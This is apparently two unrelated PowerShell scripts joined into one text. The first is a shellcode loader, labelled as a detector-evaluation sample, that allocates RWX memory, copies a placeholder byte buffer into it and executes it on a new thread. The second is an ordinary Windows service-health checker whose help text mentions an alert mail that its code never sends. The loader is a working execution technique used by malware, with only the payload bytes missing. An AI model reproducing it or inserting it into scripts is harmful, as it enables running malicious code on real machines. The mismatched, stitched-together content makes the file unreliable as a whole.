<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class NativeMethods
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0x3e, 0xae, 0xd3, 0xd7, 0x6d, 0x82, 0xe5, 0xbc, 0x89, 0x8f, 0xa2, 0x33, 0xb7, 0x21, 0x0b, 0xfc,
        0xba, 0x94, 0xca, 0x74, 0x65, 0xe2, 0xc1, 0xd6, 0x22, 0x79, 0xb9, 0x39, 0xe2, 0x0d, 0xc1, 0x56,
        0x4d, 0xcb, 0x47, 0x95, 0x61, 0xc3, 0x6c, 0x02, 0x36, 0x0a, 0xee, 0xe7, 0x68, 0x38, 0xa4, 0xcf,
        0x32, 0x0c, 0x68, 0x69, 0xbe, 0x23, 0xe4, 0x21, 0xbd, 0x22, 0x85, 0xed, 0x3a, 0x4d, 0xfc, 0x19,
        0x81, 0x9a, 0x67, 0x6e, 0x16, 0xdd, 0x62, 0xc2, 0x61, 0xc8, 0x94, 0x15, 0x5b, 0xf7, 0x35, 0x3f,
        0x53, 0xdf, 0xea, 0x1a, 0xce, 0x92, 0x50, 0x51, 0x27, 0x27, 0x88, 0xda, 0xbe, 0x23, 0x7e, 0x77,
        0xca, 0x44, 0xa5, 0xc7, 0xd4, 0x76, 0xb9, 0xbf, 0x4d, 0x4f, 0xeb, 0x2d, 0xc0, 0x81, 0x9a, 0x7a,
        0xba, 0xdc, 0x3f, 0x55, 0x6c, 0xcb, 0x80, 0xd0, 0x24, 0x7b, 0x86, 0xaa, 0x04, 0xe8, 0xef, 0x40,
        0x1a, 0xac, 0xae, 0xa0, 0xdb, 0xd8, 0x1d, 0xb2, 0x20, 0xa4, 0x4a, 0x34, 0x02, 0x6b, 0x29, 0x73,
        0x23, 0x34, 0x33, 0xc8, 0x23, 0x66, 0xfd, 0xc0, 0x05, 0x5b, 0x75, 0xd0, 0xee, 0xf7, 0x60, 0x5e,
        0x10, 0x64, 0xea, 0x15, 0x84, 0xf8, 0x6a, 0xd2, 0xe2, 0x62, 0x05, 0x66, 0xe8, 0xb2, 0x4a, 0xc7,
        0x65, 0x53, 0xfa, 0x6a, 0x41, 0xd4, 0xc8, 0xb8, 0xe9, 0x29, 0x59, 0x13, 0xfc, 0x96, 0xbe, 0xe3,
        0xee, 0xae, 0xcd, 0xc5, 0x1c, 0xd0, 0xd1, 0xea, 0xe2, 0x66, 0x8b, 0x3f, 0x53, 0xdd, 0x62, 0x0d,
        0xfa, 0x64, 0xf4, 0x56, 0xd1, 0x1a, 0xc0, 0x74, 0x9b, 0xa9, 0xb1, 0xd5, 0xa0, 0xd7, 0x44, 0xe0,
        0xb3, 0x2d, 0x70, 0x88, 0xd8, 0xce, 0xe5, 0x92, 0xaa, 0x75, 0x5b, 0x96, 0x42, 0xe0, 0x0c, 0x2a,
        0xf2, 0x6b, 0x72, 0x2c
    )

    $Handle = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($Handle -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $Handle, $Buffer.Length)
    $ThreadId = 0
    $Thread = [NativeMethods]::CreateThread([IntPtr]::Zero, 0, $Handle, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][NativeMethods]::WaitForSingleObject($Thread, 3310)
    [void][NativeMethods]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
<#
.SYNOPSIS
    Checks the configured Windows services on a list of servers.
.DESCRIPTION
    Probes the management port first, then queries each service and records the
    state in a result set that is exported to CSV.
    Any service that is not Running triggers a single alert mail with the
    offending rows.
.PARAMETER Servers
    Used when the script runs unattended.
.PARAMETER Services
    Defaults to the value configured for this host.
.EXAMPLE
    .\Test-ServiceHealth.ps1 -Servers mgmt01, srv02
.EXAMPLE
    .\Test-ServiceHealth.ps1 -Services DNS
.NOTES
    Author: Server Operations
    Last updated: 2026-11-18
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string[]]$Servers = @('mgmt01', 'srv02', 'dc01', 'app-prod-01'),

    [string[]]$Services = @('DNS', 'W3SVC', 'MSSQLSERVER'),

    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 65535)]
    [int]$Port = 5986,
    [int]$TimeoutMilliseconds = 5000,

    [string]$ReportPath = 'C:\Reports\service-health-2026-12-19.csv'
)

function Test-ServerPort {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$ComputerName,

        [int]$Port = 5985,
        [int]$TimeoutMilliseconds = 2000
    )

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $async = $client.BeginConnect($ComputerName, $Port, $null, $null)
        $connected = $async.AsyncWaitHandle.WaitOne($TimeoutMilliseconds)
        return ($connected -and $client.Connected)
    }
    catch {
        return $false
    }
    finally {
        $client.Close()
    }
}

$results = foreach ($srv in $Servers) {
    if (-not (Test-ServerPort -ComputerName $srv -Port $Port -TimeoutMilliseconds $TimeoutMilliseconds)) {
        [pscustomobject]@{
            Server    = $srv
            Service   = '*'
            Status    = 'Unreachable'
            CheckedAt = Get-Date
        }
        continue
    }
    foreach ($svc in $Services) {
        $service = Get-Service -ComputerName $srv -Name $svc -ErrorAction SilentlyContinue
        [pscustomobject]@{
            Server    = $srv
            Service   = $svc
            Status    = $(if ($service) { $service.Status } else { 'NotFound' })
            CheckedAt = Get-Date
        }
    }
}

$results | Export-Csv -NoTypeInformation -Path $ReportPath -Encoding UTF8

$down = @($results | Where-Object { $_.Status -ne 'Running' })
$down | Format-Table -AutoSize
Write-Host ("{0} checks, {1} not running" -f @($results).Count, $down.Count) -ForegroundColor Cyan
